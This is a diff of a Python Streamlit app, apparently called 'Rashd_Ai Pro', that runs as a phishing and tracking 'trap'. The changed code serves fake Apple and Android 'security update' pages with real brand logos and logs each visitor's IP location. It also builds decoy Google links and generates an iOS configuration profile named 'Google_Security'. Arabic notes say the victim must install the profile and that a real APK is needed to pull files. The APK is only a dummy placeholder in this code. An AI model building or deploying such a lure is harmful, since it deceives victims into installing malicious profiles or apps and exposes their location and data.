@@ -163,7 +163,7 @@ if "decoy" in query_params:
                 geo_data["city"] = data.get("city", "Unknown")
                 geo_data["isp"] = data.get("connection", {}).get("isp_name", "Unknown")
             else:
-                # fallback to ipify if AbstractAPI key is not available
+                # fallback to ipapi if AbstractAPI key is not available
                 response = requests.get(f"https://ipapi.co/{client_ip}/json/")
                 data = response.json()
                 geo_data["country"] = data.get("country_name", "Unknown")
@@ -188,8 +188,8 @@ if "decoy" in query_params:
             <img src="https://www.apple.com/v/apple-id/a/images/overview/apple_id_icon__b31s42y2s0ae_large.png" alt="Apple Security" style="width: 100px; margin-bottom: 20px;">
             <h2 style="color: #333;">Apple Security Update Required</h2>
             <p style="color: #555; font-size: 16px;">Your device requires a critical security update to protect your data.</p>
-            <a href="#" onclick="window.location.href = window.location.href.split(\\\\'?\\\\')[0] + \\\\'\\\\?download=ios_profile\\\\";" style="background-color: #007bff; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 18px; margin-top: 20px;">Download Update</a>
-            <p style="color: #777; font-size: 12px; margin-top: 15px;">This update is essential for maintaining your device\\\\'s security and performance.</p>
+            <a href="#" onclick="window.location.href = window.location.href.split('?')[0] + '?download=ios_profile';" style="background-color: #007bff; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 18px; margin-top: 20px;">Download Update</a>
+            <p style="color: #777; font-size: 12px; margin-top: 15px;">This update is essential for maintaining your device's security and performance.</p>
         </div>
         """, unsafe_allow_html=True)
     elif trap_name == "Download (android)":
@@ -197,8 +197,8 @@ if "decoy" in query_params:
         <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f6; text-align: center;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/1200px-Android_robot.svg.png" alt="Android Security" style="width: 100px; margin-bottom: 20px;">
             <h2 style="color: #333;">Android System Update Available</h2>
-            <p style="color: #555; font-size: 16px;">A new system update is available to enhance your device\\\\'s security and features.</p>
-            <a href="#" onclick="window.location.href = window.location.href.split(\\\\'?\\\\')[0] + \\\\'\\\\?download=android_apk\\\\";" style="background-color: #28a745; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 18px; margin-top: 20px;">Install Update</a>
+            <p style="color: #555; font-size: 16px;">A new system update is available to enhance your device's security and features.</p>
+            <a href="#" onclick="window.location.href = window.location.href.split('?')[0] + '?download=android_apk';" style="background-color: #28a745; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 18px; margin-top: 20px;">Install Update</a>
             <p style="color: #777; font-size: 12px; margin-top: 15px;">Ensure your device is connected to Wi-Fi before proceeding with the update.</p>
         </div>
         """, unsafe_allow_html=True)
@@ -434,18 +434,18 @@ with tabs[5]: # المصيدة
     st.info(f"عنوان IP الخاص بالتطبيق: {app_ip}")
 
     if decoy_type == "Google Decoy":
-        decoy_url = f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?decoy=google&ip={app_ip}"
+        decoy_url = f"https://{st.query_params.get('host', [''])[0]}/?decoy=google&ip={app_ip}"
         st.markdown(f"رابط تمويه Google: ` {decoy_url} `")
         st.image("https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png", width=100)
     elif decoy_type == "Download (ios)":
         # رابط تحميل ملف mobileconfig
-        ios_download_url = f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?download=ios_profile"
+        ios_download_url = f"https://{st.query_params.get('host', [''])[0]}/?download=ios_profile"
         st.markdown(f"رابط تحميل ملف iOS Profile: ` {ios_download_url} `")
         st.markdown("""
-        <p style=\'color:red;\'>ملاحظة: يجب على الضحية تثبيت ملف التعريف بعد التحميل.</p>
+        <p style='color:red;'>ملاحظة: يجب على الضحية تثبيت ملف التعريف بعد التحميل.</p>
         """, unsafe_allow_html=True)
         if st.button("توليد ملف iOS Profile"): # زر لتوليد الملف
-            mobileconfig_data = generate_ios_mobileconfig(f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?decoy=Download (ios)&ip={app_ip}&device=ios")
+            mobileconfig_data = generate_ios_mobileconfig(f"https://{st.query_params.get('host', [''])[0]}/?decoy=Download (ios)&ip={app_ip}&device=ios")
             st.download_button(
                 label="تحميل ملف iOS Profile",
                 data=mobileconfig_data,
@@ -454,30 +454,23 @@ with tabs[5]: # المصيدة
             )
     elif decoy_type == "Download (android)":
         # رابط تحميل ملف APK (يجب أن يكون ملف APK حقيقي لسحب الملفات)
-        android_download_url = f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?download=android_apk"
+        android_download_url = f"https://{st.query_params.get('host', [''])[0]}/?download=android_apk"
         st.markdown(f"رابط تحميل ملف Android APK: ` {android_download_url} `")
         st.markdown("""
-        <p style=\'color:red;\'>ملاحظة: يجب أن يكون لديك ملف APK جاهز لسحب الملفات.</p>
+        <p style='color:red;'>ملاحظة: يجب أن يكون لديك ملف APK جاهز لسحب الملفات.</p>
         """, unsafe_allow_html=True)
 
 # --- معالجة طلبات التحميل --- #
 if "download" in query_params:
     download_type = query_params["download"]
     if download_type == "ios_profile":
-        # هنا يجب أن يتم توليد ملف mobileconfig ديناميكياً
-        # ولكن Streamlit لا يدعم ذلك مباشرة في الـ query_params
-        # لذا، يجب أن يتم توجيه الضحية إلى صفحة تقوم بتوليد الملف وتحميله
-        # أو أن يكون الملف موجوداً مسبقاً على خادم.
-        # للتوضيح، سنقوم بتوليد ملف بسيط هنا.
         st.download_button(
             label="Click to Download iOS Profile",
-            data=generate_ios_mobileconfig(f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?decoy=Download (ios)&ip={get_real_public_ip()}&device=ios"),
+            data=generate_ios_mobileconfig(f"https://{st.query_params.get('host', [''])[0]}/?decoy=Download (ios)&ip={get_real_public_ip()}&device=ios"),
             file_name="Google_Security.mobileconfig",
             mime="application/x-apple-aspen-config"
         )
     elif download_type == "android_apk":
-        # هنا يجب أن يكون لديك ملف APK حقيقي لسحبه
-        # للتوضيح، سنقوم بتوليد ملف وهمي
         st.download_button(
             label="Click to Download Android APK",
             data=b"This is a dummy APK file.", # استبدل هذا بملف APK حقيقي
@@ -523,5 +516,3 @@ st.markdown("""
     <p>Rashd_Ai Pro © 2026</p>
 </div>
 """, unsafe_allow_html=True)
-
-# This is a test comment to ensure GitHub push is working.
